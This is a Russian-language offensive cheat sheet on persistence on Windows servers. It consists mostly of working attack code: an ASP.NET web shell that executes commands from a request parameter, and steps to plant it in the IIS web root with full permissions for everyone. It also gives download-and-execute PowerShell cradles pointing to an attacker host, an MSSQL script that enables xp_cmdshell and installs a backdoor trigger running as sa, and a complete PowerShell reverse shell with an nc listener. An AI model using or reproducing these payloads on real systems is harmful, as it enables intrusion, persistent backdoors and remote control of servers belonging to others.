# Persistence — закрепление на Windows

#### Web Shell ####
# Веб-шелл позволяет выполнять команды на сервере через веб-интерфейс.
# Обычно загружается в веб-директорию и запускается с правами IIS-пользователя (по умолчанию iis apppool\defaultapppool).
# Этот пользователь имеет привилегию SeImpersonatePrivilege, что позволяет повысить права до администратора.

## 1. Готовим веб-шелл (например, shell.aspx)
# Скачиваем готовый ASP.NET веб-шелл или создаем свой.
# Пример простого shell.aspx:
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>

## 2. Передаем веб-шелл на целевую машину
move shell.aspx C:\inetpub\wwwroot\

## 3. Настраиваем права доступа к файлу (если нужно)
icacls C:\inetpub\wwwroot\shell.aspx /grant Everyone:F

## 4. Выполняем команды через браузер
http://target/shell.aspx?cmd=whoami

## 5. Для получения reverse shell можно выполнить:
http://target/shell.aspx?cmd=powershell -c "IEX(New-Object Net.WebClient).downloadstring('http://ATTACKER_IP:8000/rev.ps1')"


#### MSSQL Trigger ####
# Триггер в MSSQL позволяет выполнить код при определенном событии в БД (например, INSERT, UPDATE, DELETE).
# Через триггер можно выполнить xp_cmdshell для запуска команд на системе.
## Итоговый скрипт для new query, после вставки выделить всё и нажать F5
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO

USE master
GRANT IMPERSONATE ON LOGIN::sa TO [Public];
GO

USE HRDB
GO

CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object Net.WebClient).downloadstring(''http://192.168.187.139:8888/evilscript.ps1'')"';
GO
### Вредоносный скрипт с обратным подключением
<!-- $client = New-Object System.Net.Sockets.TCPClient("192.168.187.139",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close() -->

## 4. На атакующей машине поднимаем HTTP-сервер с вредоносным скриптом
python3 -m http.server 8000

## 5. Запускаем слушатель для reverse shell
nc -lvp 4454

## 6. Триггер активируется при вставке данных в таблицу Employees (например, через веб-приложение)
# После вставки срабатывает xp_cmdshell, скачивает и выполняет evil.ps1, который дает reverse shell.

## 7. Получаем shell